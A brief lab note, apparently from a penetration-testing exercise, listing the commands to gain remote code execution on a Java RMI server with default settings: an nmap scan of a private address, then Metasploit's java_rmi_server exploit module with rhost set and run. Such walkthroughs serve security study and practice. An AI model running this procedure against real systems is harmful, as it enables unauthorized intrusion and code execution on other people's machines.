
## Aim 

	aim to exploit java rmi server default configuration remote code execution 

## Exploit Chain

	1.nmap search with -sC and -sV flag
	2. search in metasploit for rmiregistry
	3. use the exploit for linux
	4. set parameter like rhost
	5. and exploit


## Commands

	1. nmap -sC 192.168.24.129
	2. msfconsole
	3. search rmiregistry
	4. use exploit/multi/misc/java_rmi_server   
	5. set rhost -ip
	6. run
